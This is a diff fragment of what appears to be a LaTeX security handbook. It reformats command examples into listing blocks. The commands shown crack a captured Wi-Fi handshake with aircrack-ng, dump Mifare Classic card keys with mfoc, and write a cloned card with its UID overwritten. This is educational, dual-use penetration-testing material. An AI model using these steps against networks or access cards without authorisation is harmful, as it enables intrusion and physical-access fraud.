 			When you have successfully collected a handshake, you will be able to start a dictionary attack on it. 
 			The most simple method of this is to use the following command:
-			\begin{quote}
-				aircrack-ng -w <password list> -b <AP MAC> <capture file>
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				$ aircrack-ng -w <password list> -b <AP MAC> <capture file>
+			\end{lstlisting}
 			If a valid handshake is found, you will be informed that aircrack-ng is attempting to crack it. 
 
 			The dictionary is the most important part of this attack. 
@@ -4918,9 +4958,9 @@ list = ['one', 'two', 'three'];
 			The first step in any attack on Mifare classic cards is to get a full dump of the cards data and keys. 
 			This will allow us to edit the data as shown below, but it will also allow us to clone the card. 
 			In order to do this, the tool ``mfoc'' is used. 
-			\begin{quote}
-				mfoc -O out.mfd
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				$ mfoc -O out.mfd
+			\end{lstlisting}
 			This should output a dump of the card, which we will edit in the next section. 
 			However, this doesn't always go as planned. 
 			If you get an error, it is likely that the VM or card reading hardware that you are using is not up to the task of creating card dumps. 
@@ -4933,9 +4973,9 @@ list = ['one', 'two', 'three'];
 			When looking for blank cards, check that block 0 is unlocked, as this is the UID block that is required to create a true copy. 
 
 			To write a card, use the following command:
-			\begin{quote}
-				nfc-mfclasic w B <dump.mfc> <dump.mfc> 
-			\end{quote}
+			\begin{lstlisting}[style=CLI]
+				$ nfc-mfclasic w B <dump.mfc> <dump.mfc> 
+			\end{lstlisting}
 			If you have a to which the UID can be overwritten, change the ``w'' to ``W'' and the program will attempt to overwrite the UID. 
 			At this point, you should have written the whole dump to the card, allowing you to use it in place of the original. 
 			However, if you would like to test this, create another dump of the new card and run both dumps through a tool such as ``vbindiff'' which will check for differences between the hex of the two dumps. 
@@ -5309,9 +5349,9 @@ list = ['one', 'two', 'three'];
 				\end{table}
 				The filesystems stated in table \ref{tab:fstab} will mount automatically at boot, or when the command ``mount <file system>'' is given. 
 				However, to mount filesystems that are not constant within the system, you must use the mount\footnote{\href{http://linux.die.net/man/8/mount}{man 8 mount}} command specifically.
-				\begin{quote}
-					mount -o <option>,<option> -t <type> <file system> <directory> 
-				\end{quote}
+				\begin{lstlisting}[style=CLI]
+					# mount -o <option>,<option> -t <type> <file system> <directory> 
+				\end{lstlisting}
 				The same options and data will work here as in the fstab, however, the format it different as it is expressed at the CLI. 
 
 			\subsubsection{File System Structure}
